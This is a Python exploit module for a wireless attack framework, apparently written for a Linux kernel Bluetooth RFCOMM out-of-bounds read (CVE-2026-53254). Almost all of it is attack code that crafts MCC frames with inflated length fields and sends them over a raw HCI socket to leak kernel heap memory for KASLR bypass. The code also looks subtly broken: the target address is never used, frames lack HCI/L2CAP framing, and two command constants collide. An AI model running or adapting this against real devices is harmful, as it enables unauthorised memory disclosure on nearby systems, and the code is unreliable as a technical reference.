# Author: André Henrique (LinkedIn/X: @mrhenrike)
import socket
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """Linux Bluetooth RFCOMM MCC Frame Out-of-Bounds Read (CVE-2026-53254).

    The Linux kernel Bluetooth RFCOMM implementation contains an
    out-of-bounds read vulnerability when parsing Multiplexer Control
    Channel (MCC) frames.  The RFCOMM layer trusts the length field
    in incoming MCC command frames without validating it against the
    actual received data length.  A remote attacker within Bluetooth
    range can send a crafted RFCOMM MCC frame with a length field
    exceeding the packet boundary, causing the kernel to read past
    the allocated skb data buffer.  This leaks kernel heap memory
    contents and can be combined with other primitives for
    information disclosure or KASLR bypass.

    CVSS v3.1: 6.5 (Medium), AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Linux RFCOMM MCC Frame Out-of-Bounds Read (CVE-2026-53254)",
        "description": (
            "Exploits CVE-2026-53254, an out-of-bounds read in the Linux "
            "kernel RFCOMM MCC frame parser.  The RFCOMM layer trusts the "
            "length field in MCC command frames without bounds checking.  "
            "Sending a crafted MCC frame with inflated length causes the "
            "kernel to read past the skb buffer, leaking heap contents "
            "useful for KASLR bypass or further exploitation."
        ),
        "authors": (
            "Linux kernel security team (discovery)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2026-53254",
            "https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git",
        ),
        "disclosure_date": "2026-06-10",
        "platform": "linux",
        "arch": "all",
        "privileged": True,
        "targets": (
            "Linux kernel < 6.20.8 with Bluetooth RFCOMM",
            "Ubuntu 22.04/24.04 (unpatched)",
            "Fedora 39/40 (unpatched)",
        ),
    }

    target = OptIP("", "Target Bluetooth address (XX:XX:XX:XX:XX:XX)")
    port = OptPort(1, "RFCOMM channel (default: 1)")
    timeout = OptFloat(10.0, "Socket timeout in seconds")
    interface = OptString("hci0", "Local HCI adapter")
    mcc_length_inflate = OptInteger(512, "MCC length field inflation (bytes past actual data)")

    _AF_BLUETOOTH = 31
    _BTPROTO_HCI = 1
    _BTPROTO_RFCOMM = 3

    # RFCOMM frame types
    _RFCOMM_SABM = 0x2F
    _RFCOMM_UA = 0x63
    _RFCOMM_UIH = 0xEF
    _RFCOMM_DM = 0x0F

    # MCC commands
    _MCC_TEST = 0x08
    _MCC_FCON = 0x0A
    _MCC_FCOFF = 0x0C
    _MCC_MSC = 0x0E
    _MCC_RPN = 0x09
    _MCC_RLS = 0x05
    _MCC_PN = 0x08

    _DLCI_CONTROL = 0x00

    def _bd_addr_to_bytes(self, addr: str) -> bytes:
        parts = addr.split(":")
        return bytes(int(b, 16) for b in reversed(parts))

    def _build_rfcomm_mcc_frame(self, mcc_type: int,
                                 cr_bit: int = 1) -> bytes:
        """Build a crafted RFCOMM UIH frame on DLCI 0 (MCC channel).

        The MCC frame inside the UIH payload has its length field
        inflated beyond the actual data, triggering the OOB read
        when the kernel parses the MCC command.
        """
        addr = (self._DLCI_CONTROL << 2) | (cr_bit << 1) | 0x01
        control = self._RFCOMM_UIH

        mcc_data = b"\x42" * 16

        inflated_length = len(mcc_data) + self.mcc_length_inflate
        mcc_type_field = (mcc_type << 2) | (cr_bit << 1) | 0x01

        if inflated_length < 128:
            mcc_header = struct.pack("BB", mcc_type_field,
                                     (inflated_length << 1) | 0x01)
        else:
            mcc_header = struct.pack("BH", mcc_type_field,
                                     inflated_length << 1)

        info = mcc_header + mcc_data

        if len(info) < 128:
            length_field = struct.pack("B", (len(info) << 1) | 0x01)
        else:
            length_field = struct.pack("<H", len(info) << 1)

        fcs = self._compute_fcs(bytes([addr, control]) + length_field)

        return bytes([addr, control]) + length_field + info + bytes([fcs])

    def _compute_fcs(self, data: bytes) -> int:
        """Compute RFCOMM FCS (Frame Check Sequence) using reversed CRC-8."""
        crc_table = []
        for i in range(256):
            crc = i
            for _ in range(8):
                if crc & 1:
                    crc = (crc >> 1) ^ 0xE0
                else:
                    crc >>= 1
            crc_table.append(crc)

        fcs = 0xFF
        for byte in data:
            fcs = crc_table[fcs ^ byte]
        return 0xFF - fcs

    def _open_hci_socket(self) -> socket.socket | None:
        try:
            sock = socket.socket(self._AF_BLUETOOTH, socket.SOCK_RAW,
                                 self._BTPROTO_HCI)
            sock.settimeout(self.timeout)
            dev_id = int(str(self.interface).replace("hci", "")) if str(
                self.interface).startswith("hci") else 0
            sock.bind((dev_id,))
            return sock
        except OSError:
            return None

    def _hci_send(self, packet: bytes) -> bool:
        try:
            sock = socket.socket(self._AF_BLUETOOTH, socket.SOCK_RAW,
                                 self._BTPROTO_HCI)
            sock.settimeout(self.timeout)
            dev_id = int(str(self.interface).replace("hci", "")) if str(
                self.interface).startswith("hci") else 0
            sock.bind((dev_id,))
            sock.send(packet)
            sock.close()
            return True
        except OSError:
            return False

    @mute
    def check(self) -> bool:
        """Verify the local HCI adapter is available."""
        sock = self._open_hci_socket()
        if sock is None:
            return False
        sock.close()
        return True

    def run(self) -> None:
        if not self.target:
            print_error("target is required (Bluetooth address XX:XX:XX:XX:XX:XX)")
            return

        if not self.check():
            print_error(
                f"HCI adapter {self.interface} not available or "
                "insufficient privileges"
            )
            return

        print_success(
            f"HCI adapter {self.interface} available; targeting {self.target} "
            "with RFCOMM MCC OOB read trigger"
        )
        self._exploit()

    def _exploit(self) -> None:
        mcc_types = [
            (self._MCC_TEST, "TEST"),
            (self._MCC_PN, "PN"),
            (self._MCC_MSC, "MSC"),
            (self._MCC_RPN, "RPN"),
            (self._MCC_RLS, "RLS"),
        ]

        print_status(
            f"Sending crafted MCC frames with length inflated by "
            f"{self.mcc_length_inflate} bytes across {len(mcc_types)} MCC types"
        )

        success = 0
        for mcc_type, name in mcc_types:
            frame = self._build_rfcomm_mcc_frame(mcc_type)
            print_status(f"  MCC {name}: {len(frame)} bytes (inflated length)")

            if self._hci_send(frame):
                success += 1
            time.sleep(0.1)

        print_status(f"Sent {success}/{len(mcc_types)} crafted MCC frames")
        print_info(
            "If the target kernel has RFCOMM enabled and is vulnerable, "
            "the inflated MCC length field causes the parser to read "
            f"{self.mcc_length_inflate} bytes past the skb data buffer.  "
            "Leaked heap contents may reveal kernel addresses (KASLR bypass) "
            "or sensitive data from adjacent allocations."
        )
